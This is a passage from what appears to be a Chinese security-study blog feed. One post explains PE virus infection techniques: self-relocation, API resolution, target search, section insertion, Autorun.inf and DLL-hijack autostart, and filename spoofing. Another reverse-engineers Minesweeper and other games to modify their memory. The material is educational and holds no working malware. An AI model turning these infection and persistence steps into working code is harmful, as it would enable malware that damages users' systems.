PE病毒只感染当前目录下的<code>test.exe</code>文件，它没有破坏性。<code>test.exe</code>被感染后，首先执行病毒代码，然后执行自身代码。假设在当前目录下存在4个文件：</p><ul><li>calc.exe：计算器</li><li>notepad.exe：记事本</li><li>test.exe：测试PE文件</li><li>main.exe：PE病毒程序</li></ul><p><code>test.exe</code>文件原始大小为2.5KB，程序入口地址为<code>00401000</code>。运行<code>main.exe</code>文件后，<code>test.exe</code>文件大小变为6.5KB，入口地址变为<code>004042DC</code>，也就是病毒代码的地址。病毒将被感染的<code>test.exe</code>重命名为<code>test-ok.exe</code>，然后将当前目录下某一个<code>.exe</code>文件(比如记事本)重命名为<code>test.exe</code>，如果我们运行测试PE文件，也就是<code>test-ok.exe</code>，它也能像<code>main.exe</code>一样去感染记事本，感染完后将记事本重命名为<code>test-oo.exe</code>，计算器也是如此被感染。</p><h2 id="3-3-关键技术"><a href="#3-3-关键技术" class="headerlink" title="3.3 关键技术"></a>3.3 关键技术</h2><h3 id="3-3-1-重定位"><a href="#3-3-1-重定位" class="headerlink" title="3.3.1 重定位"></a>3.3.1 重定位</h3><p>重定位在DLL文件尤其常见，因为DLL文件会加载到不同的位置，如果再按照VA定位会出错。对于病毒程序也是一样，它有相应的代码区感染目标程序，而目标程序有很多，病毒代码写在目标程序的什么位置呢？这就需要病毒代码去定位目标程序的位置，就要利用重定位技术。</p><ul><li>关键点：病毒代码寄生在目标程序的位置不固定</li><li>shellcode类似：通常需要注入远程系统，但这段代码在远程系统什么位置有时不能确定，另外远程系统的环境有时也不能准确感知，故需要使用重定位和API函数自动获取</li></ul><p>如下图所示，左边是病毒的RVA，其地址为<code>004010xx</code>；右图是当这段代码插入到另一个Host文件后，变量的实际位置和预期位置出现了差异，而重定位的关键是知道这个差异值是多少，后续遇到的各种变量或地址都可以通过这种差异方式校正。</p><img src="/posts/adc1352a/3.3.1.png" class="" title="重定位原因"><p>但是根据Host特征逐一硬编码这种方式并不可取，繁琐且未必准确，所以采用另一种方法，那就是病毒代码运行过程中自我重定位。</p><p>假设一个变量相对于病毒起始位置的偏移是9h，那么只要通过求得病毒插入到被感染对象后的病毒起始位置 + 这个变量相对于病毒起始位置的偏移 = 变量在被感染对象中的位置。</p><p><strong>那么如何求得插入感染对象后的病毒起始位置呢？</strong>由于每个被感染对象的大小都不一样，所以病毒插入到被感染对象后的起始位置也是不一样的。</p><p>首先我们要知道一些前置知识。call指令的作用是将下一条指令的地址压入堆栈，然后设置eip寄存器指向要跳转的地址。比如下面这两条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00C9AF58   .  E8 93020000   call Crackme_.00C9B1F0</span><br><span class="line">00C9AF5D   .  6A 01         push 0x1</span><br></pre></td></tr></table></figure><p>F7进入函数，此时堆栈窗口栈顶数据为<code>00C9AF5D</code>，也就是call指令的下一条指令的地址；eip寄存器显示<code>00C9B1F0</code>，也就是指向要跳转的地址。</p><img src="/posts/adc1352a/3.3.2.png" class="" title="call指令的作用"><p>ebp是基址指针寄存器，总是指向系统栈最上面栈帧的底部。eip是指令指针寄存器，存放要执行的下一条指令的地址。</p><p>我们已经知道了call指令的功能，接下来就是利用call指令求得插入感染对象后的病毒起始位置。<strong>所以怎么利用？？变量delta也是在病毒里面的啊，与Var1有什么区别</strong></p><img src="/posts/adc1352a/3.3.3.png" class="" title="利用call指令"><h3 id="3-3-2-API函数自获取"><a href="#3-3-2-API函数自获取" class="headerlink" title="3.3.2 API函数自获取"></a>3.3.2 API函数自获取</h3><p>PE文件函数节的功能：当调用外部DLL中的API函数时，通过导入函数节这种关系定义出来，系统加载时就能加载对应的DLL文件并找到相应的API函数，再将地址写入到PE文件的导入函数表中，程序运行时就知道从导入函数表中取地址进行调用，这是正常的PE文件运行过程。通常函数节是由目标程序作者编写。</p><p>但对于病毒程序来说，它是一段代码，当它感染另外一个程序时，它是否能修改目标程序的导入函数节，而使得其可以服务病毒代码呢？理论上是可以的，但非常复杂，因为要在导入函数节添加东西一定会导致其它结构的变化，需要做很多的修正工作，这也可能破坏原有功能。所以对于病毒来说，它需要自己去获取API函数地址，并且没有导入函数节的支撑，但它又必须要使用很多API函数来实现病毒功能。</p><ul><li>关键点：需要使用API函数，但没有导入函数节支撑</li><li>shellcode类似：需要使用API函数自获取技术来确定注入远程系统的位置</li></ul><p><strong>如何获取API函数地址呢？</strong>有以下几种方法：</p><ul><li><p>搜寻宿主的导入表获得<code>GetModuleHandleA()</code>函数和<code>GetProcAddress()</code>函数的地址，然后通过它返回系统DLL的基址。因为很多程序都要使用这两个函数，因此在某些情况下是可行的。如果宿主没有使用<code>GetProcAddress()</code>，那就不得不搜寻导出表了</p></li><li><p>直接获得<code>kernel32.dll</code>的基址，然后再搜寻其导出表获得<code>GetProcAddress()</code>和<code>LoadLibraryA()</code>的地址，就能得到任何想调用的函数地址</p></li><li>硬编码调用函数，比如在9X下<code>GetModuleHandleA()</code>的地址一般是<code>BFF7xxxx</code></li></ul><p>第一种和第三种方法存在兼容性问题，第一种方法局限于目标程序使用<code>GetProcAddress()</code>函数；第三种方法存在硬编码的问题，操作系统不同就不能运行了。</p><ul><li><code>GetProcAddress()</code>函数：包括两个参数，模块基地址和想要获取的API函数名称，它将动态获得DLL函数的入口地址。</li><li><code>LoadLibraryA()</code>函数：将指定的DLL加载到内存中，返回值为DLL文件加载到内存中的基地址。</li></ul><p>明确采用第二种方法后，接下来的步骤就是获取<code>kernel32.dll</code>的基地址，通过<code>kernel32.dll</code>模块中的相应结构和特征定位。典型方法：定位<code>kernel32.dll</code>模块中任意一个地址，然后按照模块首地址特征(对齐于1000H，PE文件开始标识MZ)向低地址遍历定位PE文件头。</p><p><code>kernel32.dll</code>中任意一个地址从哪里获得？</p><ul><li>程序入口代码执行时栈顶存储的地址</li><li>SEH(结构化异常处理)链末端</li><li>PEB(进程环境块)相关数据结构指向了各模块的地址</li><li>栈中特定高端地址的数据</li></ul><p>注意：不同操作系统存在差别。</p><img src="/posts/adc1352a/3.3.4.png" class="" title="程序入口代码栈顶存储的地址"><p><strong>这个还是没说明白，看有没有合适的例子吧</strong></p><h3 id="3-3-3-目标程序遍历搜索"><a href="#3-3-3-目标程序遍历搜索" class="headerlink" title="3.3.3 目标程序遍历搜索"></a>3.3.3 目标程序遍历搜索</h3><p>通常以PE文件格式的文件(如EXE、DLL、SCR等)作为感染目标，其关键点为全盘查找或者部分盘符查找，遍历算法包括递归或非递归。在对目标进行搜索时，通常调用两个API函数：<code>FindFirstFile()</code>和<code>FindNextFile()</code>。</p><p>搜索目标进行感染算法如下：</p><ol><li>指定查找的目录为当前工作目录</li><li>开始搜索文件(*.*)</li><li>该目录搜索完毕？是则返回，否则继续</li><li>找到文件还是目录？目录则调用自身函数(也就是递归)，否则继续</li><li>是文件，如符合感染条件，则调用感染模块，否则继续</li><li>搜索下一个文件(<code>FindNextFile()</code>)，转到3继续</li></ol><h3 id="3-3-4-文件感染"><a href="#3-3-4-文件感染" class="headerlink" title="3.3.4 文件感染"></a>3.3.4 文件感染</h3><p>感染的关键是病毒代码能够得到运行，常用方法包括：</p><ul><li>选择合适的位置放入病毒代码(已有节、新增节)</li><li>将控制权交给病毒代码，如修改程序入口点<code>AddressofEntryPonit</code>，或者在原目标代码执行过程中运行病毒代码(EPO(EntryPoint Obscuring)技术)</li></ul><p>同时，病毒代码执行时，程序的正常功能不能被破坏，即控制权的交换。</p><ul><li>感染时，记录原始“程序控制点位置”</li><li>病毒代码执行完毕之后，返回控制权</li><li>避免重复感染，感染标记</li></ul><h4 id="3-3-4-1-文件感染分类"><a href="#3-3-4-1-文件感染分类" class="headerlink" title="3.3.4.1 文件感染分类"></a>3.3.4.1 文件感染分类</h4><ul><li>插入式感染：将病毒代码插入到Host文件的代码节的中间或前后。这种感染方式会增加代码节的大小，并且可能修改Host程序中的一些参数实际位置，导致Host程序运行失败。</li><li>伴随式感染：备份Host程序，用自身替换Host程序。当病毒执行完毕后，再将控制权交给备份程序。</li></ul><h4 id="3-3-4-2-感染文件基本步骤"><a href="#3-3-4-2-感染文件基本步骤" class="headerlink" title="3.3.4.2 感染文件基本步骤"></a>3.3.4.2 感染文件基本步骤</h4><ol><li><p>判断目标文件开始2字节是否为“MZ”</p></li><li><p>判断PE文件标记“PE”</p></li><li><p>判断感染标记，如果已被感染过则跳出继续执行Host程序，否则继续</p></li><li><p>获得数据目录的个数(每个数据目录信息占8个字节)</p></li><li><p>得到节表起始位置(数据目录的偏移地址 + 数据目录占用的字节数 = 节表起始地址)</p></li><li><p>得到目前最后节表的末尾偏移(紧接其后用于写入一个新的病毒节)</p><p>节表起始位置 + 节的个数 = 目前最后节表的末尾偏移</p><p>每个节表占用的字节数为0x28</p></li><li><p>写入节表和病毒节</p></li><li><p>修正文件头信息</p></li></ol><h1 id="4-捆绑释放型"><a href="#4-捆绑释放型" class="headerlink" title="4. 捆绑释放型"></a>4. 捆绑释放型</h1><p>捆绑释放型感染实现起来比较简单，目前很大一部分病毒程序都采用这种方法。捆绑释放型病毒感染时将目标Host程序作为数据存储在病毒体内，当执行病毒程序时，它先执行病毒程序，然后还原并执行Host文件，从而保证被感染的程序本身能正常运行，不会引起异样。</p><p>熊猫烧香就属于这一类病毒。如下图，左边是一个正常程序，感染后(右边)会将病毒放在前面，正常程序放在后面。程序运行时，病毒会拿到控制权，但是程序图标会显示前面的病毒程序，这也是一个明显的被感染特征。</p><img src="/posts/adc1352a/4.1.1.png" class="" title="捆绑释放型病毒"><ul><li>优点：编写简单、效率高，可感染自校验程序</li><li>缺点：被感染后的程序主体是病毒程序，易被发现(程序叠加+释放执行)，程序图标问题</li></ul><h1 id="5-系统感染型"><a href="#5-系统感染型" class="headerlink" title="5. 系统感染型"></a>5. 系统感染型</h1><p>系统感染型本身不对PE文件做任何感染操作，但它感染的目标是操作系统，也是一种寄生类的方式，只是寄生目标有所不同。这类病毒通常为独立个体，不感染系统内的其它文件。</p><p>系统感染型病毒存在两个两个关键问题：</p><ul><li><p>如何再次获得控制权——自启动</p><p>由于该程序不感染PE文件，它没有Host文件，所以如何再次获得控制权是一个关键性问题，也是目标很多病毒程序设计时不得不考虑的问题。此时和操作系统自启动相关，病毒必须依赖于该机制再次获得控制权。</p></li><li><p>如何传播：可移动存储介质(U盘、移动硬盘、刻录光盘等)、网络共享、电子邮件或其它应用。</p></li></ul><h2 id="5-1-控制权再次获取"><a href="#5-1-控制权再次获取" class="headerlink" title="5.1 控制权再次获取"></a>5.1 控制权再次获取</h2><p>操作系统启动流程：BIOS -&gt; 硬盘MBR -&gt; 活动分区DBR -&gt; 系统内部</p><p>操作系统整个启动流程也是控制权传递的过程，包括现在提出的可信计算，也是对控制权一步一步地校验，控制流程的数据完整性或行为的校验。对于操作系统本身，它的启动方式很多，系统内部包括：</p><ul><li>注册表中的键值</li><li>系统中的特定位置</li><li>配置文件</li><li>特定路径的特定文件，如<code>Explorer.exe</code>(显示桌面)</li></ul><p>如果病毒本身能很好地结合这套机制，它可以做的事情非常多，并且具有很好的隐蔽性。</p><p>其它启动方式：</p><ul><li><p>利用系统自动播放机制<code>Autorun.inf</code></p><p>比如U盘病毒或光盘病毒就是利用U盘或光盘的自动播放功能。目前，也有一些U盘插入后，不需要用户双击U盘，里面的程序也会启动。</p></li><li><p>在其它可执行文件嵌入少量触发代码</p><ul><li>修改导入函数节启动DLL病毒文件(添加相应结构，初始化代码触发)</li><li>在特定PE文件代码段插入触发代码等(只需定位可执行程序并运行)</li></ul></li><li><p>DLL劫持：替换已有DLL文件</p><p>很多应用程序或操作系统执行时，都会去执行DLL文件，如果病毒将自身做成一个DLL文件，同时将系统DLL文件替换。可想而知，系统启动时，它会根据文件名启动的，此时病毒DLL文件就会拿到控制权，如果拿到控制权之后再进一步装载原始DLL文件，这样系统的本身机制也不会受到影响，隐蔽性更强。该方法非常常见，甚至有一些病毒程序将反病毒软件可依赖的DLL文件替换。</p></li></ul><h2 id="5-2-病毒的传播方式"><a href="#5-2-病毒的传播方式" class="headerlink" title="5.2 病毒的传播方式"></a>5.2 病毒的传播方式</h2><p>一切可对外交互的渠道都可传播，包括：</p><ul><li>各类存储设备(软盘、光盘、U盘、移动硬盘、智能设备)</li><li>各类网络通信方式(QQ、MSN、Email、淘宝旺旺、微信、微博等)</li><li>各类网络连接方式(有线、WIFI、蓝牙等)</li><li>各类网络应用(迅雷、BT等)</li></ul><p>邮件蠕虫越来越常见，其中以邮件附件的形式进行传播较多。附件中可能包含病毒包括exe文件、rar文件、pdf文件、doc文件、xls文件、jpg文件、chm文件等。下图是一个包含病毒的邮件附件，显示为一个word文档，后缀名doc，图标显示也是word。但它的真实后缀是scr(屏保)，它其实是利用了一种技术，在文件名里插入翻转字符，然后将翻转字符之后的其它字符进行了翻转，它的完整文件名应该是“5月TW行lmcod.scr”。这也是一种欺骗性很强的攻击手法。</p><img src="/posts/adc1352a/5.2.1.png" class="" title="包含病毒的邮件附件"><p>再补充一个通过可移动存储设备传播的非感染式病毒，即<code>Autorun.inf</code>。下图显示了<code>Autorun.inf</code>文件，如果文件存在U盘根目录，当我们双击这个U盘时，它就会触发对应的病毒，如果选择U盘盘符右键打开或打开资源管理器，这时进入的也是病毒程序。当然下面的演示是计算器程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[AutoRun]</span><br><span class="line">open=mspaint.exe</span><br><span class="line">shell\open=打开(&amp;O)</span><br><span class="line">shell\open\Command=calc.exe</span><br><span class="line">shell\open\Default=1</span><br><span class="line">shell\explore=资源管理器(&amp;X)</span><br><span class="line">shell\explore\Command=calc.exe</span><br></pre></td></tr></table></figure><img src="/posts/adc1352a/5.2.2.png" class="" title="Autorun.inf"><p>还有一类是伪装的文件夹，如下图所示的<code>photo.exe</code>文件，当Windows操作系统默认不显示<code>.exe</code>时，它就能伪装成文件夹，当我们双击之后就会运行病毒，同时可以打开某个文件夹进行隐蔽。</p><img src="/posts/adc1352a/5.2.3.png" class="" title="photo.exe"><p>最后，补充“摆渡”知识点，这种攻击行为经常发生在一些具有特殊目的病毒程序身上。期望通过可移动的媒介来渗透一些平时不联网的电脑中，并从中获取数据，利用摆渡的方式植入病毒或木马到内网，比较典型的案例就是Stuxnet。</p><p>下图展示了Stuxnet震网事件的漏洞利用过程和启动方式，传统的Autorun方式很容易被禁止掉，而Stuxnet利用的是lnk漏洞（MS10-046），它会在目标U盘下放入lnk快捷方式及病毒程序（如DLL文件）。不管通过什么方式进入U盘，lnk文件都会被解析从而触发漏洞，导致U盘中的病毒程序被执行。</p><img src="/posts/adc1352a/5.2.3.png" class="" title="Stuxnet震网事件">]]></content>
    
    
    <summary type="html">&lt;p&gt;以后我们很长时间都要与Windows PE病毒打交道，所以在这里就先了解下它的分类及感染方式吧。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>逆向分析基础</title>
    <link href="http://example.com/posts/8ba499c5.html"/>
    <id>http://example.com/posts/8ba499c5.html</id>
    <published>2022-05-21T00:41:19.909Z</published>
    <updated>2022-05-23T04:43:09.764Z</updated>
    
    <content type="html"><![CDATA[<p>现在就要跟随 <a href="https://blog.csdn.net/Eastmount">Eastmount</a> 老师学习系统安全与恶意代码分析了，是的，终于要真正的系统地学习了~加油小凉！</p><span id="more"></span><h1 id="1-逆向分析学习路线"><a href="#1-逆向分析学习路线" class="headerlink" title="1. 逆向分析学习路线"></a>1. 逆向分析学习路线</h1><img src="/posts/8ba499c5/%E5%AD%A6%E4%B9%A0%E6%8A%80%E8%83%BD%E5%9B%BE.png" class="" title="逆向分析学习路线"><h1 id="2-逆向分析的典型应用"><a href="#2-逆向分析的典型应用" class="headerlink" title="2. 逆向分析的典型应用"></a>2. 逆向分析的典型应用</h1><h2 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h2><p>逆向分析主要是剖析病毒，包括：</p><ul><li>获取病毒传播方法，遏制病毒传播</li><li>获取病毒隐藏手段，根除病毒</li><li>获取功能目的，溯源定位攻击者</li></ul><h2 id="2-2-游戏保护"><a href="#2-2-游戏保护" class="headerlink" title="2.2 游戏保护"></a>2.2 游戏保护</h2><p>这个主要是用来做游戏外挂。比如修改攻击力、防御值、金币等。</p><h2 id="2-3-漏洞挖掘"><a href="#2-3-漏洞挖掘" class="headerlink" title="2.3 漏洞挖掘"></a>2.3 漏洞挖掘</h2><p>逆向应用还包括漏洞挖掘和漏洞利用，其中黑客挖掘漏洞的常用方法为：</p><ul><li>通过分析开源软件的源代码，获取漏洞</li><li>通过分析产品本身，获取漏洞</li><li>通过分析可以利用漏洞的软件样本</li><li>通过比较软件前后补丁的差异</li></ul><p>比如官方软件在网上有安全更新，关注安全行情和漏洞公告的行当或企业会对比官方的补丁，在拿到官方升级后的软件，他们会对两个软件流程作比较，分析补丁补了哪里，再详细分析为什么多了这个检测。注意，官方公告通常会非常简略(补丁号、造成后果、影响范围)。比如某个MP3播放器在播放某个冷门格式的音频文件时，会触发一个远程溢出问题，我们就需要去逆向分析，下载升级前后版本做流程对比。</p><h2 id="2-4-电子取证"><a href="#2-4-电子取证" class="headerlink" title="2.4 电子取证"></a>2.4 电子取证</h2><p>通过样本试图找出是谁(Who)、在什么时间(When)、在哪里(Where)、怎样地(How)进行了什么(What)(非法)活动。</p><h2 id="2-5-无文档学习"><a href="#2-5-无文档学习" class="headerlink" title="2.5 无文档学习"></a>2.5 无文档学习</h2><p>表示没有源码的情况下获取程序信息，称为竞品分析。假设某个公司对同行的产品很感兴趣，想知道为什么他们的算法比我们好，然后需要去分析和算法还原，这也是逆向分析的主要应用。</p><h1 id="3-扫雷游戏逆向分析"><a href="#3-扫雷游戏逆向分析" class="headerlink" title="3. 扫雷游戏逆向分析"></a>3. 扫雷游戏逆向分析</h1><img src="/posts/8ba499c5/2.1.png" class="" title="扫雷"><p>扫雷中肯定有雷区的定义，作为程序员，你会怎样定义有雷或无雷，或者插旗子状态呢？我们会使用一个二维数组来存储。那么，什么时候肯定会访问这个二维数组呢？在绘制整个游戏区、点击方格的时候都会访问到。</p><p>在绘制游戏区时，Windows编程有个关键函数<code>BeginPaint()</code>，它为指定窗口进行绘图工作的准备，并用将和绘图有关的信息填充到一个<code>PAINTSTRUCT</code>结构中，所以它将是一个突破口。</p><p>在逆向分析中，动态分析和静态分析非常多，动静结合也是常用的分析手段。</p><ul><li>静态分析：程序并未运行，通过分析文件的结构(格式)获取其内部原理。</li><li>动态分析：在程序的运行过程中，分析其内部原理。</li><li>灰盒分析：既不静态也不动态调试，通过一堆监控软件(注册表监控、文件监控、进程监控、敏感API监控)在虚拟机中跑程序，再分析恶意软件的大体行为，并形成病毒分析报告。</li></ul><p>至于哪种方法更好？具体问题具体分析。如果分析扫雷，因为没有危害可以动态调试，但如果是WannaCry蠕虫，就不能在真机上动态调试。同时，很多安全公司为了及时响应各种安全事件，会把样本自动上传到服务器中，他们每天会收到成千上万的恶意样本，但可能存在某些未知样本只上传部分的原因，比如某个未知样本是个动态链接库，此时没有运行条件，只能进行静态分析或者模拟接口分析。</p><h2 id="3-1-OD动态分析"><a href="#3-1-OD动态分析" class="headerlink" title="3.1 OD动态分析"></a>3.1 OD动态分析</h2><p>我们采用动态分析的方法分析扫雷程序。之前我们猜测游戏中存在一个二维数组，当我们显示界面时会访问这个二维数组，并且调用<code>BeginPaint()</code>函数来显示页面，所以接下来需要找到调用<code>BeginPaint()</code>的位置。</p><p>将程序载入OD，Ctrl + N 查找当前模块中的名称，输入<code>BeginPaint</code>，右键 -&gt; 在每个参考上设置断点。</p><img src="/posts/8ba499c5/2.1.1.png" class="" title="查找BeginPaint"><p>Alt + B 去到断点窗口，发现只有一个。F9 运行程序至断点处，此时程序界面还没出来。</p><img src="/posts/8ba499c5/2.1.2.png" class="" title="去到BeginPaint被调用的汇编代码处"><p>发现<code>BeginPaint()</code>函数下面还有一个<code>EndPaint()</code>，表示绘图结束，也就是游戏结束。所以这两个函数之间的数据就是我们玩游戏的过程。两个系统函数之间只有一个程序函数<code>01002AC3()</code>，选中该行 Enter 跟随该函数。</p><img src="/posts/8ba499c5/2.1.3.png" class="" title="去到BeginPaint被调用的汇编代码处"><p>发现这里面也有几个程序函数，一个个看后发现只有<code>010026A7()</code>里有双重循环，也就是构成二维数组的基本条件。</p><p>当然，这种方法太过草率也太耗费时间了，如果遇到大一点的程序，工作量还是挺大的。可以使用另一种方法。当我们在玩扫雷时，它的界面并没有闪烁，所以怀疑使用了双缓存技术。</p><p>双缓存是在缓存中一次性绘制，再把绘制的结果返回到界面上。比如要在屏幕上绘制一个圆、正方形、直线，需要调用GDI的显示函数，操作显卡画一个圆，再画一个正方形、一条直线，需要访问硬件3次，此时依赖硬件的访问速度。为了减少硬件操作，我们在内存中把需要绘制的图像准备好，一切妥当后再提交给硬件显示。</p><p><code>BitBlt()</code>函数是将内存中的数据提交到显示器上，该函数对指定的源设备环境区域中的像素进行位块转换，以传送到目标设备环境。同样方法查找<code>BitBlt()</code>函数，设置断点，运行，程序停在了<code>010026A7()</code>函数里的<code>BitBlt()</code>函数中。需要注意的是，调用<code>BitBlt()</code>函数有两处地方，为了验证这里是否是我们要找的地方，可以单步调试看看游戏界面情况。</p><img src="/posts/8ba499c5/2.1.4.png" class="" title="单步数次执行的界面情况"><p>绘制一个个方块的过程，也就是初始化“有雷”和“无雷”的过程，说明我们之前找的地方没错。</p><p>另一处调用<code>BitBlt()</code>函数，是点击方块时，绘制该方块是“数字”还是“雷”的过程。这时候只是将这个过程显示在用户界面上，对我们来说只是一个验证作用。</p><p><code>010026A7()</code>函数里的<code>BitBlt()</code>函数在界面初始化“有雷”和“无雷”，那肯定将这些数据存在了某个地方。接下来就是分析这双重循环。</p><img src="/posts/8ba499c5/2.1.5.png" class="" title="分析双重循环"><img src="/posts/8ba499c5/2.1.6.png" class="" title="分析双重循环"><img src="/posts/8ba499c5/2.1.7.png" class="" title="分析双重循环"><p>经过<code>mov al,byte ptr ds:[ebx+esi]</code>可以知道al的值是取数据段寄存器中以ebx为基址，esi为偏移的地址的内容。</p><img src="/posts/8ba499c5/2.1.8.png" class="" title="分析双重循环"><p>所以ebx存的就是“有雷”和“无雷”二维数组的首地址。我们知道，一行有9个方块，根据规律可以猜测，<code>10</code>作为边界，<code>0F</code>表示空，<code>8F</code>就是雷。</p><p>将所有断点取消，数据窗口 Ctrl + G 定位到地址<code>01005360</code>，验证猜测。</p><p>注意，如果第一次点击的就是雷的话，会改变雷的位置(可能是避免倒霉孩子没有游戏体验吧)。如果方块中是旗子显示<code>8E</code>，方块中是空白显示<code>40</code>，方块中是1则显示<code>41</code>，2是<code>42</code>，以此类推。雷被点中后将<code>8F</code>改为<code>CC</code>，将剩余的雷改为<code>8A</code>。经过多次游戏，证实了上面的猜测。</p><img src="/posts/8ba499c5/2.1.9.png" class="" title="分析双重循环"><h2 id="3-2-逆向辅助工具CE"><a href="#3-2-逆向辅助工具CE" class="headerlink" title="3.2 逆向辅助工具CE"></a>3.2 逆向辅助工具CE</h2><p>Cheat Engine又称CE修改器，是一款内存修改编辑工具。可以通过Cheat Engine来修改游戏中的内存数据、人物属性、金币数值等等。</p><p>我们现在的目的是利用CE获取第一个方块的地址，验证与在OD找的是否一致。运行扫雷，打开CE，附加扫雷进程。在OD中看，一个字节存储在一个方块中，所以将数值类型设为“字节”，扫描类型设为“未知的初始数值”，首次扫描。</p><img src="/posts/8ba499c5/2.2.1.png" class="" title="CE使用"><img src="/posts/8ba499c5/2.2.2.png" class="" title="CE使用"><p>此时显示1056768个数据。接着点击第一个方块，该方块由<code>0F</code>变为<code>40</code>，所以在扫描类型中选择“变动的数值”，再次扫描。</p><img src="/posts/8ba499c5/2.2.3.png" class="" title="CE使用"><p>点击扫雷，由于第一个方块不再变化数值，所以选择“未变动的数值”进行筛选，再次扫描，连续几次，发现数据的个数一直在变小，说明经过几轮筛选逐渐缩小范围。如果出现地雷则选择“未变动的数值”，再次扫描。</p><img src="/posts/8ba499c5/2.2.4.png" class="" title="CE使用"><p>点击笑脸重新开始游戏，此时第一个方块从<code>40</code>变为<code>0F</code>，所以扫描类型修改为“变动的数值”，再次扫描。</p><p>重复上述步骤，直到结果为1。</p><img src="/posts/8ba499c5/2.2.5.png" class="" title="CE使用"><p>这个地址刚好是我们在OD中找的第一个方块的地址。</p><img src="/posts/8ba499c5/2.2.6.png" class="" title="CE使用"><img src="/posts/8ba499c5/2.2.7.png" class="" title="CE使用"><p>第二步验证扫雷的边界。自定义扫雷的高度为9，扫出来有1627个数据。再次定义高度为16，从9变到16的数据有4个。再次定义高度为24，从16变到24的有2个。因为边界需要两个值来定义，所以就是<code>01005338</code>和<code>010056A8</code>。</p><img src="/posts/8ba499c5/2.2.8.png" class="" title="CE使用"><p>同样筛选出存储宽度的地址，分别是<code>01005334</code>和<code>010056AC</code>。筛选出雷数的存储地址为<code>01005330</code>。</p><p>后面就可以利用这些地址开始学习研究了，比如一秒实现扫雷等。</p><h1 id="4-吕布传游戏逆向分析"><a href="#4-吕布传游戏逆向分析" class="headerlink" title="4. 吕布传游戏逆向分析"></a>4. 吕布传游戏逆向分析</h1><p>关于NPC说话太慢，找到快速跳过对话的方法。</p><p>将<code>Ekd5.exe</code>载入OD，查找当前模块中的名称，查看调用了哪些函数。发现程序竟然有几个钩子函数。</p><img src="/posts/8ba499c5/4.1.1.png" class="" title="查看调用函数"><p>钩子函数是Windows消息处理机制的一部分，通过设置“钩子”，应用程序可以在系统级对所有消息、事件进行过滤，访问在正常情况下无法访问的消息。钩子的本质是一段用以处理系统消息的程序，通过系统调用，把它挂入系统。</p><ul><li>SetWindowsHookEx：设置钩子函数</li><li>CallNextHookEx：将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息</li><li>UnhookWindowsHookEx：上一个函数<code>SetWindowsHookEx()</code>的返回值，钩子在使用完之后需要用该函数卸载</li></ul><p>在每个<code>SetWindowsHookEx()</code>处下断，一共两处。运行，停在了<code>00429EF7</code>处。可以看到该钩子函数是通过键盘输入触发，回调函数的地址为<code>0040D307</code>，也就是触发后会去到该地址处。</p><p>Ctrl + G 去到该地址处，下断，运行。游戏载入，随意从键盘上输入。</p><img src="/posts/8ba499c5/4.1.2.png" class="" title="游戏界面"><p>此时触发钩子函数，使汇编去到<code>0040D307</code>处。我输入的是“a”，运行到cmp指令时，eax存的值就是“a”的ASCII码的十六进制形式，与<code>0x20</code>(空格)进行对比，往下看还有与<code>0x30</code>(“0”)、<code>0x35</code>(“5”)对比的。</p><img src="/posts/8ba499c5/4.1.3.png" class="" title="eax对比"><p>先看<code>0x20</code>。重载运行，在键盘按下空格键。对比通过，进入<code>00406A33</code>函数，这个函数里有一个创建线程函数，线程在<code>00406A7F</code>处。继续跟随到该地址，下断运行。</p><img src="/posts/8ba499c5/4.1.4.png" class="" title="创建线程函数"><p>在<code>00406A7F</code>函数中，有两个<code>PostMessage()</code>函数，该函数的作用是将一条消息放入消息队列中。一个是“鼠标按下”，另一个是“鼠标弹起”，中间还有个<code>sleep()</code>函数，这个过程是模拟玩家点击鼠标的操作。</p><img src="/posts/8ba499c5/4.1.5.png" class="" title="PostMessage函数"><p>那么，我们就找到了一个快速跳过对话的方法，就是按空格键。要想取消快速对话，同样也是按空格键。<code>ds:[0x500E02]</code>中存储着跳过与否的值，“1”表示快速跳过，“0”表示不跳过。</p><p><code>0x30</code>(“0”)、<code>0x35</code>(“5”)没什么用的，可能只是过滤玩家的不合法输入。</p><h1 id="5-植物大战僵尸游戏逆向分析"><a href="#5-植物大战僵尸游戏逆向分析" class="headerlink" title="5. 植物大战僵尸游戏逆向分析"></a>5. 植物大战僵尸游戏逆向分析</h1><h2 id="5-1-CE逆向修改阳光值"><a href="#5-1-CE逆向修改阳光值" class="headerlink" title="5.1 CE逆向修改阳光值"></a>5.1 CE逆向修改阳光值</h2><p>修改阳光值首先要知道存储阳光值的地址在哪里。通过CE找到该地址，为<code>25B42938</code>。</p><img src="/posts/8ba499c5/5.1.1.png" class="" title="CE查找存储阳光值的地址"><p>打开资源管理器，查看这个游戏的进程ID，为12064。</p><img src="/posts/8ba499c5/5.1.2.png" class="" title="CE查找存储阳光值的地址"><p>在修改阳光值之前，要先确定我们要修改值的窗口是哪一个，可以通过API函数<code>FindWindow()</code>来查找。这个函数检索处理顶级窗口的类名和窗口名称匹配指定的字符串，这个函数不搜索子窗口。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HWND <span class="title function_">FindWindow</span><span class="params">(</span></span><br><span class="line"><span class="params">    LPCSTR lpClassName,</span></span><br><span class="line"><span class="params">    LPCSTR lpWindowName</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li>lpClassName：指向一个以NULL字符结尾的、用来指定类名的字符串或一个可以确定类名字符串的原子。如果该参数为null时，将会寻找任何与<code>lpWindowName</code>参数匹配的窗口。</li><li>lpWindowName：指向一个以NULL字符结尾的、用来指定窗口名（即窗口标题）的字符串。如果此参数为null，则匹配所有窗口名。</li></ul><p><code>FindWindow()</code>需要传入两个参数，即窗口的类型和窗口的标题。这里可以用到Visual Studio中的Spy++工具来查看在本机中运行的窗口的相关信息。</p><img 